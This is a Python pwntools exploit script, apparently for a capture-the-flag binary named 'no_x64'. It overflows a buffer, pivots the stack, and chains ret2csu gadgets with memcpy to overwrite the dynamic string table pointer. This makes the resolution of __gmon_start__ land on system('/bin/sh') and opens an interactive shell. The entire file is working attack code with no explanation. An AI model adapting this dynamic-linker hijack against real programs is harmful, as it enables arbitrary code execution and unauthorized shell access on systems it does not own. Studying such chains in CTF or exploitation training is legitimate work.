#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./no_x64')
elf = ELF('./no_x64')

memcpy_got = elf.got['memcpy']
gmon_start_plt = elf.plt['__gmon_start__']

buf = 0x600a40

# readelf -a ./no_x64 | grep .dynamic 
#   [21] .dynamic          DYNAMIC          00000000006007e0  000007e0
dynamic = 0x00000000006007e0
dynstr_addr = dynamic + 8 * 16

leave_ret = 0x0000000000400605
pop_rdi_ret = 0x0000000000400673

#gdb.attach(p, 'b *0x400606\nc')

def csu(func, rdi, rsi, rdx):
        payload = ( 
                p64(0x40066a) + p64(0) + p64(1) + p64(func) + p64(rdx) + p64(rsi) + p64(rdi) + 
                p64(0x400650) + 56 * '\x00'
        )   
        return payload

def memcpy(dst, src, length):
	return csu(memcpy_got, dst, src, length)

st_name = 0x2f
payload = (
	((
		'A' * 14 + # padding
		p64(buf + 1024 - 8) + # set rbp=buf+1024-8
		p64(leave_ret) # stack pivot ; set rsp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		memcpy(dynstr_addr + 8, buf + 2048, 8) +
		p64(pop_rdi_ret) +
		p64(buf + 2048 + 16) +
		p64(gmon_start_plt)
	).ljust(2048, '\x00') + # buf+2048
	p64(buf + 2048 + 8 - st_name) + # set strtab=&"system\x00"
	'system\x00\x00' +
	'/bin/sh\x00'
)
p.recvuntil('> ')
p.sendline(payload)

p.interactive()

